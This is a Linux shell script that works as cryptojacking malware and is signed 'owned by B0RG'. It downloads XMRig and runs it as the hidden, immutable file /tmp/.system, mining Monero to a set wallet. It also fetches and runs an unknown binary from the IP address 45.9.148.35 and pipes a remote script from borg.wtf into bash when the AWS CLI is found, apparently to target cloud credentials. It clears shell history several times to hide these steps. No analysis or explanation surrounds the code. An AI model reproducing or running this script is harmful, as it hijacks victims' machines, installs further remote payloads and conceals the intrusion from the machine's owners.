#!/bin/sh

# wget -O - http://45.9.148.35/chimaera/sh/xmr.sh.sh | sh

if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi ; fi

if [ ! -f "/tmp/.system" ]; then
wget --no-check-certificate https://github.com/xmrig/xmrig/releases/download/v6.8.1/xmrig-6.8.1-linux-static-x64.tar.gz -O /tmp/xmr.tar.gz
tar xvf /tmp/xmr.tar.gz -C /tmp/ --strip=1 ; rm -f /tmp/xmr.tar.gz ; mv /tmp/xmrig /tmp/.system && chmod +x /tmp/.system && chattr +i /tmp/.system && cd /tmp/
./.system -o pool.supportxmr.com:3333 --donate-level=1 --coin=monero -u 46EPFzvnX5GH61ejkPpNcRNm8kVjs8oHS9VwCkKRCrJX27XEW2y1NPLfSa54DGHxqnKfzDUVW1jzBfekk3hrCVCmAUrFd3H -p GesichtsKirmes -B
cd / ; fi
history -c
clear

if [ ! -f "/tmp/.kernel" ]; then wget -q http://45.9.148.35/aws -O /tmp/.kernel && chmod +x /tmp/.kernel && chattr +i /tmp/.kernel && cd /tmp/ && ./.kernel && cd / ; fi
history -c
clear

if type aws 2>/dev/null 1>/dev/null; then wget -O - borg.wtf/aws.sh | bash ; fi
history -c
clear

if [ -f "/tmp/.x1mr" ]; then rm -f /tmp/.x1mr ; fi
if [ -f "/tmp/.x2mr" ]; then rm -f /tmp/.x2mr ; fi
history -c
clear

# end! owned by B0RG!
